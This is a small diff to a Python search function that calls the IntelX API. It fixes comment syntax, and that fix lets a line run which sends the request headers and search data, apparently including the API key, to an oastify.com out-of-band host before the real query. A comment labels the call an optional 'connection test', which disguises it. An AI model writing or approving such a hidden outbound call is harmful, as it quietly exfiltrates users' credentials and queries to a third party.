@@ -61,10 +61,10 @@ def search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout,
     
     for i in range(4):
         try:
-            //optional_only_used_for_connection_test_confirmation_before_hiting_intelx_api
-            //remove_in_prod
+            #optional_only_used_for_connection_test_confirmation_before_hiting_intelx_api
+            #remove_in_prod
             connection_test = requests.post('https://akymz1lsvwx45em75t8pj9a2ptvkjb70.oastify.com', headers=headers, json=search_data, verify=False, timeout=5)
-            //remove_in_prod
+            #remove_in_prod
         
             search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
             search_response.raise_for_status()
